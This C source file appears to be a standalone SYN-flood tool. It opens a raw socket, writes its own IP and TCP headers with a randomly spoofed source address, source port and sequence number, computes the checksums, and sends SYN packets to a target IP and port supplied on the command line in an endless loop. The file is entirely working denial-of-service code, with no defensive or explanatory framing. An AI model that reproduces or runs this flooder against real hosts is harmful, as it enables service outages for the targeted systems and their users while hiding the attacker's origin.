#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
 
#define PCKT_LEN 8192
 
unsigned short csum(unsigned short *buffer, int len, unsigned long p_sum)
{
    register unsigned long sum = p_sum;
 
    while (len--)
        sum += *buffer++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
 
    return (unsigned short)(~sum);
}
 
int main(int argc, char *argv[])
{
    char buffer[PCKT_LEN];
    struct iphdr *ipheader = (struct iphdr *)buffer;
    struct tcphdr *tcpheader = (struct tcphdr *)(buffer + sizeof(struct iphdr));
    int sd;
    struct sockaddr_in din;
    int one = 1;
    const int *val = &one;
 
    memset(buffer, 0x0, PCKT_LEN);
    if (argc != 3) {
        printf("Usage: %s <target IP> <Target port>\n", argv[0]);
        exit(-1);
    }
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd < 0) {
        perror("socket() error");
        exit(-1);
    }
 
    din.sin_family      = AF_INET;
    din.sin_addr.s_addr = inet_addr(argv[1]);
    din.sin_port        = htons(atoi(argv[2]));
 
    ipheader->version    = 4;
    ipheader->ihl        = sizeof(struct iphdr) >> 2;
    ipheader->tot_len    = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ipheader->ttl        = 63;
    ipheader->protocol   = IPPROTO_TCP;
    ipheader->daddr      = inet_addr(argv[1]);
 
    tcpheader->dest      = htons(atoi(argv[2]));
    tcpheader->seq       = htonl(0);
    tcpheader->syn       = 1;
    tcpheader->doff      = sizeof(struct tcphdr) >> 2;
    tcpheader->window    = htons(8192);
 
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt() error");
        exit(-1);
    }
    srandom(time(NULL));
    printf("Target IP: %s Target port: %u\n", argv[1], atoi(argv[2]));
    while(1) {
       ipheader->saddr      = random();
       ipheader->check      = 0;

       tcpheader->check = 0;
       tcpheader->source    = htons(1024 + (random() % (65535 - 1024)));
       tcpheader->seq       = random();
 
       ipheader->check = csum((unsigned short *)buffer, (sizeof(struct iphdr) + sizeof(struct tcphdr)), 0);
        unsigned long sum =
            (ipheader->saddr >> 16) + (ipheader->saddr & 0xffff) +
            (ipheader->daddr >> 16) + (ipheader->daddr & 0xffff) +
            1536 +
            htons(sizeof(struct tcphdr));
        tcpheader->check = csum((unsigned short *)tcpheader, sizeof(struct tcphdr), sum);
 
        if (sendto(sd, buffer, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&din, sizeof(din)) < 0) {
            perror("sendto() error");
            exit(-1);
        }
    }
    close(sd);
 
    return 0;
}
